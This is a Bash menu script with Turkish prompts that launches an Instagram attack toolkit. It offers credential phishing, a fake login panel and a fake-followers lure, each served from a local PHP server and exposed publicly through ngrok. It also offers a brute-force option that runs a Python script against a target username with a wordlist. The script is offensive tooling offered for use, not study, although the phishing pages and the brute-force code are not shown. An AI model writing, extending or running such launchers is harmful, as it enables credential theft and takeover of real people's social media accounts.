#!/bin/bash|
#Turkish Guy Tim


clear

echo -e '\033[33;40;1m
 ______________________   __   __
 \e[31m|__   __/ __ _|__   __|  \ \ / /
 \e[33m   | | | |  __   | |      \ V / 
 \e[31m   | | | | |_ |  | |       > <   \e[37m  İnstagram
 \e[33m   | | | |__| |  | |      / . \ 
 \e[31m   |_|  \_____|  |_|     /_/ \_\
    \e[32m=============================
'
echo -e "\033[31;40;1m
\e[31m==========================================================|                                              
\033[31;40;1m|[01]\e[33m İnstagram Phishing   \e[31m| \033[31;40;1m[03]\e[33m İnstagram Brute-Force   \e[31m|
\033[31;40;1m|[02]\e[33m İnstagram Fake Panel \e[31m| [04]\e[33m İnstagram Fake Followers\e[31m|                              \e[31m|
\e[31m==========================================================|

\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"

echo -e "\e[31m"
read -p "İşlem Numarası Girin: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: insta01"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Instagram-phishing/
	php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 3 || $islem == 03 ]]; then
        cd  Instagram-bruteforce/
        read -p "Hedef Kullanıcının Username : " username
        echo ""
        read -p "Wordlist'in Bulunduğu Dizin : " password
        python3 instagram.py $username $password -m 3

elif [[ $islem == 2 || $islem == 02 ]]; then
        site="Instagram-fakepanel/"
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: insta02"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Instagram-fakepanel/
	php -S 127.0.0.1:$port > -t & ngrok http $port
	
elif [[ $islem == 4 || $islem == 04 ]]; then
        site="Instagram-fakepanel/"
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: insta04"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Instagram-instafollowers/
	php -S 127.0.0.1:$port > -t & ngrok http $port
	
	elif [[ $islem == 9 || $islem == 99 ]]; then
	clear
	echo -e "\e[31mTurkish Guy Tim İyi Günler Diler"
	sleep 1 
	exit 1
elif [[ $islem == 00 ]]; then
	cd ..
	cd ..
	bash tgtx.sh


else
	echo -e '\033[31;40;1m Lütfen İşlem Numaranızı Kontrol Edin'
	sleep 2
	clear
	bash instagram.sh
fi
